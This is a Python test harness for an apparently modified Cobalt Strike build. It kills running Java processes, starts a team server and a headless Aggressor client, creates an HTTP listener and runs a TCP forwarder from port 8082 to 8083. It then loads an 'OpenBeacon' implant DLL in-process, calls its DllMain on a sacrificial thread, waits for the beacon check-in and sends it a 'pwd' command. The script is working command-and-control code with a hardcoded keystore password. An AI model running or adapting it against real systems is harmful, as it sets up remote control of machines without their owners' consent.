# -*- coding: utf-8 -*-
"""openbeacon_test2.py - single-script test: TS, listener on 8083, logging
forwarder 8082->8083, beacon child, INITIAL check."""
import os
import re
import struct
import socket
import subprocess
import sys
import threading
import time

P3 = r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-ts\p3-llvm-bench"
TSBOOT = P3 + r"\tsboot_run"
LOG = TSBOOT + r"\r1.log"
JDK = r"C:\Users\Administrator\Desktop\jdk-21.0.12.1\bin"
JAR = P3 + r"\build\libs\cs-gradle-4.9.1-SNAPSHOT-all.jar"
OB_DLL = r"C:\Users\Public\openbeacon_x64.dll"
OUT = open(r"C:\Users\Public\openbeacon_test2.log", "w", encoding="utf-8")
FWDLOG = open(r"C:\Users\Public\fwd.log", "w", encoding="utf-8")


def log(m):
    OUT.write("[%s] %s\n" % (time.strftime("%H:%M:%S"), m))
    OUT.flush()
    print(m, flush=True)


fwd_seen = []


def forwarder():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", 8082))
    s.listen(16)
    log("forwarder bound 8082")
    while True:
        c, addr = s.accept()
        log("conn from %s" % (addr,))
        try:
            up = socket.create_connection(("127.0.0.1", 8083), timeout=10)
        except Exception as e:
            log("upstream fail %s" % e)
            c.close()
            continue
        def c2s():
            try:
                first = c.recv(65536)
                if first:
                    fwd_seen.append(first)
                    log("REQ: %r" % first[:500])
                    up.sendall(first)
                while True:
                    d = c.recv(65536)
                    if not d:
                        break
                    up.sendall(d)
            except Exception:
                pass
        def s2c():
            try:
                while True:
                    d = up.recv(65536)
                    if not d:
                        break
                    c.sendall(d)
            except Exception:
                pass
        threading.Thread(target=c2s, daemon=True).start()
        threading.Thread(target=s2c, daemon=True).start()


def main():
    r = subprocess.run(["powershell", "-NoProfile", "-Command",
                        'Get-CimInstance Win32_Process -Filter "name=\'java.exe\' or name=\'javaw.exe\'" | '
                        'ForEach-Object { "$($_.ProcessId)" }'],
                       capture_output=True, text=True, timeout=60)
    for p in [x.strip() for x in r.stdout.split() if x.strip().isdigit()]:
        subprocess.run(["taskkill", "/PID", p, "/F"], capture_output=True)
    time.sleep(4)
    for f in (TSBOOT + r"\r1_inbox.txt", TSBOOT + r"\r1_ack.txt"):
        if os.path.exists(f):
            os.remove(f)

    subprocess.Popen([JDK + r"\java.exe",
                      "--add-opens=java.base/sun.net.www.protocol.https=ALL-UNNAMED",
                      "--add-opens=java.base/sun.net.www.protocol.http=ALL-UNNAMED",
                      "--add-opens=java.base/java.net=ALL-UNNAMED",
                      "-Xmx2g", "-XX:+AggressiveHeap", "-XX:+UseParallelGC",
                      "-Djavax.net.ssl.keyStore=cobaltstrike.store",
                      "-Djavax.net.ssl.keyStorePassword=123456",
                      "-cp", JAR, "server.TeamServer", "192.168.100.200", "franken", "r2_inj_tpd.profile"],
                     cwd=TSBOOT)
    time.sleep(12)
    subprocess.Popen([JDK + r"\javaw.exe",
                      "--add-opens=java.base/sun.net.www.protocol.https=ALL-UNNAMED",
                      "--add-opens=java.base/sun.net.www.protocol.http=ALL-UNNAMED",
                      "--add-opens=java.base/java.net=ALL-UNNAMED",
                      "-Xmx512m", "-cp", JAR,
                      "aggressor.headless.Start", "192.168.100.200", "50050", "franken-opOB", "franken",
                      "headless_franken.cna"],
                     cwd=TSBOOT)
    deadline = time.time() + 120
    while time.time() < deadline:
        if "READY" in open(LOG, encoding="utf-8", errors="replace").read()[-400:]:
            break
        time.sleep(3)
    log("TS ready")

    sys.path.insert(0, TSBOOT)
    from tier3_common import send
    send("listener_create", "franken-http2", "8083", "192.168.100.200")
    time.sleep(5)

    threading.Thread(target=forwarder, daemon=True).start()
    time.sleep(2)

    # beacon child
    import ctypes, threading
    k32 = ctypes.windll.kernel32
    k32.LoadLibraryW.restype = ctypes.c_void_p
    h = k32.LoadLibraryW(OB_DLL)
    log("OpenBeacon loaded: %s" % bool(h))
    # official delivery: call DllMain(4) on a sacrificial thread; the beacon
    # runs synchronously on it (in this test, on this daemon thread)
    base = h
    e_lfanew = struct.unpack_from("<I", ctypes.string_at(base + 0x3C, 4))[0]
    entry_rva = struct.unpack_from("<I", ctypes.string_at(base + e_lfanew + 24 + 0x10, 4))[0]
    entry = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_uint,
                               ctypes.c_void_p)(base + entry_rva)
    threading.Thread(target=lambda: entry(base, 4, None), daemon=True).start()
    log("DllMain(4) dispatched on sacrificial thread (entry rva=0x%x)" % entry_rva)

    p0 = len(open(LOG, encoding="utf-8", errors="replace").read())
    bid = None
    t0 = time.time()
    while time.time() - t0 < 120:
        seg = open(LOG, encoding="utf-8", errors="replace").read()[p0:]
        m = re.findall(r"INITIAL\t(\d+)", seg)
        if m:
            bid = m[-1]
            break
        time.sleep(2)
    log("INITIAL: %s" % (bid or "NONE in 120s"))
    log("forwarder saw %d request(s)" % len(fwd_seen))
    if bid:
        send("target", bid)
        time.sleep(2)
        p1 = len(open(LOG, encoding="utf-8", errors="replace").read())
        send("pwd")
        t0 = time.time()
        ok = False
        while time.time() - t0 < 60:
            seg = open(LOG, encoding="utf-8", errors="replace").read()[p1:]
            if re.search(r"ALT\t" + bid + r"\t.*[Cc]urrent directory", seg):
                ok = True
                break
            time.sleep(2)
        log("pwd round trip: %s" % ok)
    log("VERDICT: %s" % ("PASS" if (bid and ok) else "FAIL"))


if __name__ == "__main__":
    try:
        main()
    finally:
        OUT.close()
        FWDLOG.close()
